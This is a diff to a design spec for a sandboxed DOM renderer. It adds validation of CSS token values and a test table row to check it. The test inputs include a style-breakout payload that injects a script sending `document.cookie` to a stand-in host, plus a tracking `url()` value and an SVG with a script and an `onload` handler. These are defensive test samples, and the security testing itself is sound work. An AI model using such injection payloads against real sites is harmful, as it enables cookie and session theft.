@@ -11,7 +11,8 @@ render requests (task 13) from it, and provides the hidden renderer that keeps l
 while the lens is closed (P5-Q).
 
 It is the second line of G7: **the renderer builds DOM with `createElement` from allowlisted kinds**
-and re-checks every property (task 23's `allowedStyle`) before `style.setProperty`. The only HTML
+and re-checks every property (task 23's `allowedStyle`) before `style.setProperty`, and every token
+value (`allowedTokenValue`, review I2) before `setProperty` on `:root`. The only HTML
 string it ever assigns is the fixed shell below.
 
 ## Files
@@ -42,7 +43,10 @@ export const FRAME_ATTRS = { sandbox: "allow-same-origin", tabIndex: -1, "aria-h
 export interface BuildContext {
   doc: Document;                              // the iframe's document (a DOM Document, not the wire type)
   assetUrl: (ref: string) => string | null;   // a resolved blob: URL, or null while it loads
-  tokens: Token[];                            // written to :root with setProperty('--name', value)
+  tokens: Token[];                            // written to :root with setProperty('--name', value),
+                                              // each only if allowedTokenValue(type, value) (task 23,
+                                              // review I2); a refused token is not set, counted in
+                                              // refusedTokens, and its var() falls back
 }
 
 // buildNode makes one element for one wire Node, and never its children:
@@ -61,7 +65,7 @@ export interface BuildContext {
 //   Every element gets data-node=<id> for hit-testing; hidden → the hidden attribute.
 export function buildNode(ctx: BuildContext, n: Node): Element;
 
-export interface BuildStats { elements: number; refusedStyles: number; refusedTags: number }
+export interface BuildStats { elements: number; refusedStyles: number; refusedTags: number; refusedTokens: number }
 ```
 
 ```ts
@@ -159,6 +163,7 @@ export function HiddenRenderer(props: { transport: CanvasTransport; canvasId: st
 | `buildDom.test.ts › svgWalk` | `svg: "<svg xmlns='http://www.w3.org/2000/svg'><script/><path d='M0 0' onload='x'/></svg>"` → a path with `d`, no script, no `onload`; the built root's and the path's `namespaceURI` are both `"http://www.w3.org/2000/svg"` | DOMParser output inserted unwalked; an SVG in no namespace, which draws nothing (review I8) |
 | `buildDom.test.ts › svgNoNamespace` | `svg: "<svg><path d='M0 0'/></svg>"` (no `xmlns`, a bypass of the server) and `svg: "<svg xmlns='http://www.w3.org/2000/svg'><path></svg>"` (ill-formed: a `parsererror` document) → nothing built, `refusedTags` 1 each | an invisible element counted as rendered, or a `parsererror` drawn into the artboard |
 | `buildDom.test.ts › svgIdsDistinct` | two svg nodes `n-000000000001` and `n-000000000002` in one document, each with the canonical markup task 07's `TestSVG_idsPerNode` produces for `<linearGradient id="paint0_linear">` + `fill="url(#paint0_linear)"` (the two exact canonical strings are literals in both tests, and the Go test asserts `SanitiseSVG` produces them byte for byte, so the sides cannot drift) → every `[id]` in the document is distinct, and each path's `fill` names a gradient whose `closest("svg")` is its own root; a third node whose markup carries `id="paint0_linear"` unprefixed, or `fill="url(#n-000000000001-paint0_linear)"`, has that id or ref removed | the second icon resolving to the first icon's gradient (review I8) |
+| `buildDom.test.ts › tokenRefused` | `tokens: [{name: "brand", type: "font-family", value: "red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>"}, {name: "bg", type: "color", value: "url(https://tracker.example/p.png)"}, {name: "ok", type: "color", value: "#2fb3bd"}]` → `:root`'s `getPropertyValue("--brand")` and `("--bg")` are `""`, `("--ok")` is `#2fb3bd`, `refusedTokens: 2` (a spy on `setProperty` sees `--ok` only) | a token value reaching `setProperty` unchecked (review I2) |
 | `buildDom.test.ts › textNewlines` | `"a\nb"` → text, `<br>`, text | newlines collapsed |
 | `buildDom.test.ts › assetRewrite` | `background-image: url(asset:sha256-…)` → the cache's `blob:` URL | an `asset:` URL the CSP blocks |
 | `patch.test.ts › minimal` | a `set_props` event on one node rebuilds that element only (identity of siblings kept) | a full re-render per event (flicker, lost scroll) |
